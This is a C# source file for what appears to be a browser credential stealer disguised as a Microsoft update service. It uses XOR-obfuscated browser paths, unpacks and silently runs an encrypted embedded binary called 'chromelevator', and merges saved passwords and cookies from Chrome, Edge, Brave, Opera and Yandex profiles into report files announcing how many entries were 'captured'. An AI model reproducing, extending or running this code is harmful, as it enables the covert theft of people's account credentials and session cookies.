using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using Microsoft.Data.Sqlite;
using FinalBot;

namespace Microsoft.UpdateService.Modules
{
    public class DataService
    {
        private static string D(string s)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
            return new string(c);
        }

        private static void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
            Console.WriteLine(line);
            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", line + "\n"); } catch { }
        }

        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        // Browser base paths (User Data level, not profile level)
        private readonly Dictionary<string, string> _browserBasePaths;

        public DataService()
        {
            _browserBasePaths = new Dictionary<string, string>
            {
                {"Chrome",     Path.Combine(_localAppData, D("Bjjbi`"), D("Fujhb"), D("Pvbo!Eaub"))},
                {"Edge",       Path.Combine(_localAppData, D("Hlfwjvjcq"), D("@ab`"), D("Pvbo!Eaub"))},
                {"EdgeBeta",   Path.Combine(_localAppData, D("Hlfwjvjcq"), D("@ab`!Gbud"), D("Pvbo!Eaub"))},
                {"Brave",      Path.Combine(_localAppData, D("Gwdtb\x56jluzdob"), D("Gwdtb.Gwjzrbo"), D("Pvbo!Eaub"))},
                {"Opera",      Path.Combine(_appData, D("Jqbwd!\x56jluzdob"), D("Jqbwd!\x56udkcb"))},
                {"Opera GX",   Path.Combine(_appData, D("Jqbwd!\x56jluzdob"), D("Jqbwd!H]!\x56udkcb"))},
                {"Yandex",     Path.Combine(_localAppData, D("Xdobz"), D("XdobzKwjzrbo"), D("Pvbo!Eaub"))},
            };
        }

        public async Task<string> RunAll()
        {
            var reports = new List<string>();
            try
            {
                // 0. Persistent output dir next to EXE
                string projectOutput = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Output");
                if (!Directory.Exists(projectOutput)) Directory.CreateDirectory(projectOutput);

                Log($"Output dir: {projectOutput}");

                // 1. Run Chromelevator bypass for all browsers
                await RunChromelevator();

                // 2. Process the VOutput results folder
                string tempDir   = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                string vOutputDir = Path.Combine(tempDir, "VOutput");

                if (Directory.Exists(vOutputDir))
                {
                    Log($"VOutput found: {vOutputDir}");

                    // Merge all password files from all subdirectories into one
                    var allPassLines = new List<string>();
                    allPassLines.Add("═══ 💎 ALL PASSWORDS REPORT 💎 ═══");
                    allPassLines.Add($"Generated: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                    allPassLines.Add(new string('═', 40));
                    allPassLines.Add("");

                    int foundPassCount = 0;
                    int foundCookieFiles = 0;
                    var allCookieLines = new List<string>();

                    // Scan VOutput and any subdirs (browser name folders)
                    var dirsToScan = new List<string> { vOutputDir };
                    dirsToScan.AddRange(Directory.GetDirectories(vOutputDir, "*", SearchOption.AllDirectories));

                    foreach (var dir in dirsToScan)
                    {
                        string dirName = Path.GetFileName(dir);
                        
                        // Look for passwords.txt in this dir
                        string passFile = Path.Combine(dir, "passwords.txt");
                        if (!File.Exists(passFile))
                        {
                            // Also check all_passwords.txt or similar names
                            var passFiles = Directory.GetFiles(dir, "*password*", SearchOption.TopDirectoryOnly);
                            if (passFiles.Length == 0) passFiles = Directory.GetFiles(dir, "*pass*", SearchOption.TopDirectoryOnly);
                            if (passFiles.Length > 0) passFile = passFiles[0];
                        }

                        if (File.Exists(passFile))
                        {
                            var lines = File.ReadAllLines(passFile);
                            if (lines.Length > 0)
                            {
                                // Count entries
                                int entries = lines.Count(l => l.StartsWith("pass ") || l.StartsWith("password:"));
                                if (entries == 0) entries = lines.Length / 4; // domain/log/pass format
                                
                                if (entries > 0 || lines.Length > 2)
                                {
                                    foundPassCount += entries;
                                    if (dir != vOutputDir)
                                        allPassLines.Add($"🌐 === Browser: {dirName.ToUpper()} ===");
                                    allPassLines.AddRange(lines);
                                    allPassLines.Add("");
                                    Log($"Merged {entries} passwords from: {dirName}");
                                }
                            }
                        }

                        // Look for cookies
                        string cookieFile = Path.Combine(dir, "cookies.txt");
                        string[] cookieFiles2 = Directory.GetFiles(dir, "*cookie*", SearchOption.TopDirectoryOnly);
                        string? actualCookieFile = File.Exists(cookieFile) ? cookieFile : (cookieFiles2.Length > 0 ? cookieFiles2[0] : null);
                        
                        if (actualCookieFile != null)
                        {
                            foundCookieFiles++;
                            var cLines = File.ReadAllLines(actualCookieFile);
                            if (cLines.Length > 0)
                            {
                                allCookieLines.Add($"# === {dirName} ===");
                                allCookieLines.AddRange(cLines);
                                allCookieLines.Add("");
                                Log($"Merged cookies from: {dirName}");
                            }
                        }
                    }

                    // Write merged files
                    string mergedPassPath = Path.Combine(vOutputDir, "All_Passwords.txt");
                    string mergedCookiePath = Path.Combine(vOutputDir, "All_Cookies.txt");
                    
                    File.WriteAllLines(mergedPassPath, allPassLines, Encoding.UTF8);
                    
                    if (allCookieLines.Count > 0)
                        File.WriteAllLines(mergedCookiePath, allCookieLines, Encoding.UTF8);

                    // Copy to persistent Output directory
                    File.Copy(mergedPassPath, Path.Combine(projectOutput, "All_Passwords.txt"), true);
                    if (allCookieLines.Count > 0)
                        File.Copy(mergedCookiePath, Path.Combine(projectOutput, "All_Cookies.txt"), true);

                    if (foundPassCount > 0)
                    {
                        reports.Add($"✅ <b>Passwords captured:</b> ~{foundPassCount} entries from all profiles.");
                        reports.Add($"📁 Saved to: <code>Output\\All_Passwords.txt</code>");
                    }
                    else
                    {
                        reports.Add("⚠️ No passwords found (empty or no saved passwords in browsers).");
                    }

                    if (foundCookieFiles > 0)
                    {
                        reports.Add($"🍪 <b>Cookies:</b> {foundCookieFiles} browser(s) captured.");
                        reports.Add($"📁 Saved to: <code>Output\\All_Cookies.txt</code>");
                    }
                    else
                    {
                        reports.Add("🍪 No cookies found.");
                    }

                    Log($"Done. Passes: {foundPassCount}, Cookie files: {foundCookieFiles}");
                }
                else
                {
                    Log($"VOutput not found at: {vOutputDir}");
                    
                    // Check if chromelevator even ran
                    string elevatorPath = Path.Combine(tempDir, "chromelevator.exe");
                    if (!File.Exists(elevatorPath))
                        reports.Add("❌ chromelevator.exe not found — embedded resource may be missing.");
                    else
                        reports.Add("❌ Browser extraction failed: VOutput folder was not created by chromelevator.");
                }
            }
            catch (Exception ex)
            {
                Log($"CRITICAL ERROR: {ex.Message}\n{ex.StackTrace}");
                reports.Add($"❌ Critical error: <code>{System.Net.WebUtility.HtmlEncode(ex.Message)}</code>");
            }

            return string.Join("\n", reports);
        }

        private async Task RunChromelevator()
        {
            try
            {
                string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

                string elevatorPath = Path.Combine(tempDir, "chromelevator.exe");
                string outputDir    = Path.Combine(tempDir, "VOutput");

                // Clean old output
                if (Directory.Exists(outputDir))
                {
                    try { Directory.Delete(outputDir, true); } catch { }
                }
                Directory.CreateDirectory(outputDir);

                // Extract chromelevator from embedded resources if not already present
                if (!File.Exists(elevatorPath))
                {
                    Log("Extracting chromelevator from embedded resources...");
                    var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                    using Stream? stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
                    if (stream == null)
                    {
                        // Fallback: look for it in the EXE dir
                        string localBin = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chromelevator.exe");
                        if (File.Exists(localBin))
                        {
                            File.Copy(localBin, elevatorPath, true);
                            Log($"Using local chromelevator from: {localBin}");
                        }
                        else
                        {
                            Log("ERROR: chromelevator.bin resource not found and no local copy exists!");
                            return;
                        }
                    }
                    else
                    {
                        using MemoryStream ms = new MemoryStream();
                        stream.CopyTo(ms);
                        byte[] bytes = ms.ToArray();
                        for (int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
                        File.WriteAllBytes(elevatorPath, bytes);
                        Log($"Extracted chromelevator ({bytes.Length / 1024} KB) to: {elevatorPath}");
                    }
                }

                Log($"Running chromelevator: {elevatorPath}");
                Log($"Output dir: {outputDir}");

                var proc = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName  = elevatorPath,
                        Arguments = $"all --method nt -o \"{outputDir}\"",
                        UseShellExecute        = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                        CreateNoWindow         = true
                    }
                };
                proc.Start();

                string stdout = await proc.StandardOutput.ReadToEndAsync();
                string stderr = await proc.StandardError.ReadToEndAsync();
                await proc.WaitForExitAsync();

                Log($"chromelevator exit code: {proc.ExitCode}");
                if (!string.IsNullOrEmpty(stdout)) Log($"STDOUT: {stdout.Substring(0, Math.Min(500, stdout.Length))}");
                if (!string.IsNullOrEmpty(stderr)) Log($"STDERR: {stderr.Substring(0, Math.Min(500, stderr.Length))}");
            }
            catch (Exception ex)
            {
                Log($"RunChromelevator FAILED: {ex.Message}");
            }
        }

        // Format a raw passwords.txt into a pretty report
        private static void GeneratePrettyFile(string inputFile, string outputFile)
        {
            try
            {
                var lines = File.ReadAllLines(inputFile);
                var passwords = new List<PasswordEntry>();

                for (int i = 0; i < lines.Length; i += 4)
                {
                    if (i + 2 >= lines.Length) break;

                    passwords.Add(new PasswordEntry {
                        Url  = lines[i].Replace("domain ", "").Trim(),
                        User = lines[i + 1].Replace("log ", "").Trim(),
                        Pass = lines[i + 2].Replace("pass ", "").Trim()
                    });
                }

                var grouped = passwords.GroupBy(p => ExtractDomain(p.Url)).OrderBy(g => g.Key);

                using (StreamWriter sw = new StreamWriter(outputFile, false, Encoding.UTF8))
                {
                    sw.WriteLine("═══ 💎 BROWSER PASSWORDS REPORT 💎 ═══");
                    sw.WriteLine();

                    foreach (var group in grouped)
                    {
                        sw.WriteLine("🌐 DOMAIN: " + group.Key.ToUpper());
                        foreach (var p in group)
                        {
                            sw.WriteLine("  👤 Login:    " + p.User);
                            sw.WriteLine("  🔑 Password: " + p.Pass);
                            sw.WriteLine("  🔗 Link:     " + p.Url);
                            sw.WriteLine();
                        }
                        sw.WriteLine(new string('═', 30));
                    }
                }
            }
            catch { }
        }

        private static string ExtractDomain(string url)
        {
            if (string.IsNullOrEmpty(url)) return "UNKNOWN";
            try
            {
                if (!url.Contains("://")) url = "http://" + url;
                Uri uri = new Uri(url);
                string host = uri.Host;
                if (host.StartsWith("www.")) host = host.Substring(4);
                return host.ToUpper();
            }
            catch { return url.ToUpper(); }
        }

        private class PasswordEntry
        {
            public string Url  { get; set; } = "";
            public string User { get; set; } = "";
            public string Pass { get; set; } = "";
        }
    }
}
